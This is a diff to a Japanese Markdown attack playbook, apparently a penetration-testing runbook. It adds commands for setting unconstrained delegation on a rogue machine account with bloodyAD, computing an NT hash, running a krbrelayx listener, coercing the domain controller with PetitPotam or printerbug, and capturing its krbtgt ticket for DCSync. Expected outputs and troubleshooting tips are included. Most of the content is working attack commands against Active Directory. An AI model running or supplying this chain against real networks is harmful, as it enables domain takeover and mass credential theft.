@@ -49,14 +49,28 @@ impacket-addcomputer \
 
 ### Step 2: Unconstrained Delegation を設定
 
-`SeEnableDelegationPrivilege` を持つユーザーの権限で設定：
+`SeEnableDelegationPrivilege` を持つユーザーの権限で設定する。実行環境に応じて以下から選ぶ。
+
+**方法A: bloodyAD（攻撃側 Linux から実行。Windows シェル不要）**
+
 ```bash
-# ATTACKER$ に Unconstrained Delegation を設定
-# BloodHound で SeEnableDelegationPrivilege を確認したユーザーのシェルから
+# [Attacker] bloodyAD（別途インストール要: pip install bloodyAD --break-system-packages）
+bloodyAD \
+  -u '[USER]' -d '[DOMAIN]' -p '[PASSWORD]' \
+  --host '[DC_IP]' \
+  add uac 'ATTACKER$' -f TRUSTED_FOR_DELEGATION
+```
+
+出力に `['TRUSTED_FOR_DELEGATION'] property flags added to ATTACKER$'s userAccountControl` が出れば成功。
+
+**方法B: PowerShell AD モジュール（Windows シェル内から実行）**
+
+```powershell
+# [Target] Windows シェル内。Active Directory モジュールが必要
 Set-ADComputer ATTACKER$ -TrustedForDelegation $True
 ```
 
-または impacket を使って属性を直接変更する。
+> **どちらを選ぶか：** Linux 攻撃側からリモートで設定できる方法 A が主流。Windows WinRM シェルが取れていても、DC 上に AD モジュールがない環境では方法 A の方が確実。
 
 ### Step 3: DNS レコードの追加
 
@@ -82,6 +96,22 @@ python3 /path/to/krbrelayx/addspn.py \
 
 ### Step 5: krbrelayx でリスナーを起動
 
+**事前準備（必須）： ATTACKER$ パスワードを NT ハッシュに変換する**
+
+Kerberos 認証では平文パスワードでなく NT ハッシュが必要。以下のコマンドで変換する：
+
+```bash
+# [Attacker]
+python3 -c "
+import hashlib, binascii
+password = '[CLIENT_PROVIDED_PASSWORD]'
+nt_hash = binascii.hexlify(hashlib.new('md4', password.encode('utf-16-le')).digest()).decode()
+print(nt_hash)
+"
+```
+
+出力された 32 文字の hex 文字列が NT ハッシュ。次の `krbrelayx.py` の `-hashes :[NT_HASH]` に使う。
+
 **重要:** バックグラウンド実行時に stdin が EOF になって即終了するため、`tail -f /dev/null` でパイプする。
 
 ```bash
@@ -98,15 +128,40 @@ tail -f /dev/null | python3 /path/to/krbrelayx/krbrelayx.py \
   -dc-ip [DC_IP] &
 ```
 
-### Step 6: Printer Bug で DC を強制認証
+### Step 6: DC を強制認証（Coercion）
+
+DNS 伝搬を待つ必要がある（レコード追加後 **最大 180 秒**）。`dig attacker.[DOMAIN] @[DC_IP]` で A レコードが返ってきたら準備完了。
+
+DC を強制的に攻撃側マシンへ認証させるツールを使う。使えるかどうかは DC のパッチ適用状況による。
+
+**方法A: PetitPotam.py（MS-EFSRPC を利用）**
 
 ```bash
+# [Attacker]  GitHub: https://github.com/topotam/PetitPotam
+python3 PetitPotam.py \
+  -target-ip [DC_IP] \
+  -u '[MACHINE_ACCOUNT$]' -p '[MACHINE_ACCOUNT_PASSWORD]' \
+  attacker.[DOMAIN] [DC_FQDN]
+```
+
+出力に `[+] Attack worked!` が出れば DC が認証を試みている。
+
+**方法B: printerbug.py（MS-RPRN / Print Spooler を利用）**
+
+```bash
+# [Attacker]  GitHub: https://github.com/dirkjanm/krbrelayx/
 python3 /path/to/krbrelayx/printerbug.py \
   '[DOMAIN]/[USER]@[DC_FQDN]' \
   attacker.[DOMAIN]
 ```
 
-成功すると `/tmp/loot/` に `DC$@[DOMAIN]_krbtgt@[DOMAIN].ccache` が保存される。
+| 状況 | 選択 |
+|------|------|
+| Print Spooler が有効（`spoolss` が応答）| どちらでも可。方法 B が安定することが多い |
+| Print Spooler が無効・パッチ済み | 方法 A（MS-EFSRPC は別のサービス） |
+| どちらも応答しない | DC が coercion に対して強化済み → 別の攻撃経路を検討 |
+
+成功すると krbrelayx リスナーに `Got ticket for DC1$@[DOMAIN] [krbtgt@[DOMAIN]]` が表示され、`.ccache` ファイルが保存される。
 
 ### Step 7: DC の TGT で DCSync
 
@@ -126,9 +181,12 @@ impacket-secretsdump \
 | 症状 | 原因・対処 |
 |------|-----------|
 | krbrelayx がすぐに終了する | `tail -f /dev/null \|` を先頭に追加してパイプする |
-| DC が NTLM で接続してくる | ATTACKER$ に SPN が設定されていない → Step 4 を確認 |
-| `printerbug` でログエラーが出る | impacket のバージョン互換性の問題。動作自体は正常なことが多い |
+| DC が NTLM で接続してくる | ATTACKER$ に SPN が設定されていない → Step 4 を確認。`bloodyAD get object 'ATTACKER$' --attr servicePrincipalName` で確認できる |
+| `printerbug` でログエラーが出る | impacket のバージョン互換性の問題。動作自体は正常なことが多い。PetitPotam に切り替えても可 |
+| PetitPotam が `RPC_ACCESS_DENIED` を出して `[+] OK! Using unpatched function!` と続く | 正常動作。`EfsRpcOpenFileRaw` はパッチ済みだが別の関数で攻撃が成立している |
+| DNS がまだ解決できない | Step 3 のレコード追加から最大 180 秒待つ。`dig attacker.[DOMAIN] @[DC_IP]` で確認 |
 | `KRB_AP_ERR_SKEW` | 時刻のずれ → `sudo ntpdate [DC_IP]` |
+| TRUSTED_FOR_DELEGATION が設定できない | `SeEnableDelegationPrivilege` が現在のユーザーに付与されているか `whoami /priv` で確認する |
 
 ---
 
